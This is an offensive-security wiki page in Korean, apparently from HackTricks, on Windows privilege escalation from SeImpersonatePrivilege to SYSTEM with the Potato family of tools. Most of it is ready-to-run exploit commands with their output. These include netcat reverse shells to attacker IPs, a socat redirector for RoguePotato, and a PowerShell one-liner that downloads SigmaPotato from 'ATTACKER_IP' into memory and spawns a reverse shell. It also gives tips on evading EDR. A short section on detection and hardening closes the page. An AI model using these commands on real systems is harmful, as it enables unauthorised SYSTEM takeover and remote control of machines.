# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato는 작동하지 않습니다** Windows Server 2019 및 Windows 10 빌드 1809 이후 버전에서. 그러나 [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** 는 **동일한 권한을 활용하여 `NT AUTHORITY\SYSTEM`** 권한 수준에 도달하는 데 사용할 수 있습니다. 이 [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)는 `PrintSpoofer` 도구에 대해 심도 있게 다루며, JuicyPotato가 더 이상 작동하지 않는 Windows 10 및 Server 2019 호스트에서 impersonation 권한을 악용하는 데 사용할 수 있습니다.

> [!TIP]
> 2024–2025년에 자주 유지되는 현대적인 대안은 SigmaPotato(GodPotato의 포크)로, 인메모리/.NET reflection 사용과 확장된 OS 지원을 추가합니다. 아래의 빠른 사용법과 References의 리포지토리를 참조하세요.

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## 요구 사항 및 일반적인 주의사항

다음의 모든 기법은 impersonation-capable privileged service를, 다음 권한 중 하나를 보유한 컨텍스트에서 악용하는 데 의존합니다:

- SeImpersonatePrivilege (가장 흔함) 또는 SeAssignPrimaryTokenPrivilege
- 토큰이 이미 SeImpersonatePrivilege를 가지고 있다면 High integrity는 필요하지 않습니다(예: IIS AppPool, MSSQL 등 많은 서비스 계정에서 전형적임).

권한을 빠르게 확인:
```cmd
whoami /priv | findstr /i impersonate
```
Operational notes:

- 쉘이 SeImpersonatePrivilege가 없는 제한된 토큰으로 실행되는 경우(특정 상황에서 Local Service/Network Service에 흔함), FullPowers를 사용해 계정의 기본 권한을 복구한 다음 Potato를 실행하세요. 예: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer는 Print Spooler 서비스가 실행 중이며 로컬 RPC 엔드포인트(spoolss)를 통해 접근 가능해야 합니다. PrintNightmare 이후 Spooler가 비활성화된 하드닝된 환경에서는 RoguePotato/GodPotato/DCOMPotato/EfsPotato를 선호하세요.
- RoguePotato는 TCP/135에서 접근 가능한 OXID resolver가 필요합니다. egress가 차단된 경우 redirector/port-forwarder를 사용하세요(아래 예 참조). 이전 빌드에서는 -f 플래그가 필요했습니다.
- EfsPotato/SharpEfsPotato는 MS-EFSR을 악용합니다; 한 파이프가 차단된 경우 다른 파이프(lsarpc, efsrpc, samr, lsass, netlogon)를 시도하세요.
- RpcBindingSetAuthInfo 실행 중 오류 0x6d3은 일반적으로 알 수 없거나 지원되지 않는 RPC 인증 서비스임을 나타냅니다; 다른 파이프/전송을 시도하거나 대상 서비스가 실행 중인지 확인하세요.

## Quick Demo

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
참고:
- -i를 사용하면 현재 콘솔에서 대화형 프로세스를 생성할 수 있고, -c는 한 줄 명령을 실행합니다.
- Spooler 서비스가 필요합니다. 비활성화되어 있으면 실패합니다.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
아웃바운드 135가 차단된 경우, redirector에서 socat을 통해 OXID resolver를 pivot하세요:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
팁: 하나의 pipe가 실패하거나 EDR이 이를 차단하면, 다른 지원되는 pipes를 시도해 보세요:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
참고:
- Windows 8/8.1–11 및 Server 2012–2022에서 SeImpersonatePrivilege가 있으면 작동합니다.

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato는 RPC_C_IMP_LEVEL_IMPERSONATE로 기본 설정된 서비스 DCOM 객체를 대상으로 하는 두 가지 변형을 제공합니다. 제공된 바이너리를 빌드하거나 사용하고 명령을 실행하세요:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (업데이트된 GodPotato 포크)

SigmaPotato는 .NET reflection을 통한 메모리 내 실행과 PowerShell reverse shell 헬퍼 같은 현대적 편의 기능을 추가합니다.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
## 탐지 및 하드닝 노트

- named pipes를 생성하고 즉시 token-duplication APIs를 호출한 다음 CreateProcessAsUser/CreateProcessWithTokenW를 호출하는 프로세스를 모니터링하세요. Sysmon은 유용한 텔레메트리를 제공할 수 있습니다: Event ID 1 (process creation), 17/18 (named pipe created/connected), 그리고 SYSTEM으로 자식 프로세스를 생성하는 명령줄.
- Spooler hardening: Print Spooler 서비스를 필요하지 않은 서버에서 비활성화하면 spoolss를 통한 PrintSpoofer-style 로컬 강제 권한 상승을 방지할 수 있습니다.
- Service account hardening: SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege의 커스텀 서비스에 대한 할당을 최소화하세요. 가능한 경우 최소 권한이 부여된 가상 계정으로 서비스를 실행하고, service SID 및 쓰기 제한 토큰으로 격리하는 것을 고려하세요.
- Network controls: outbound TCP/135를 차단하거나 RPC endpoint mapper 트래픽을 제한하면 내부 리디렉터가 없는 경우 RoguePotato가 동작하지 않을 수 있습니다.
- EDR/AV: 이러한 도구들은 대부분 시그니처로 널리 탐지됩니다. 소스에서 재컴파일하거나 심볼/문자열을 변경하거나 in-memory 실행을 사용하면 탐지를 줄일 수 있지만, 강력한 행위 기반 탐지는 우회하기 어렵습니다.

## 참고 자료

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – 서비스 계정의 기본 토큰 권한 복원](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)

{{#include ../../banners/hacktricks-training.md}}
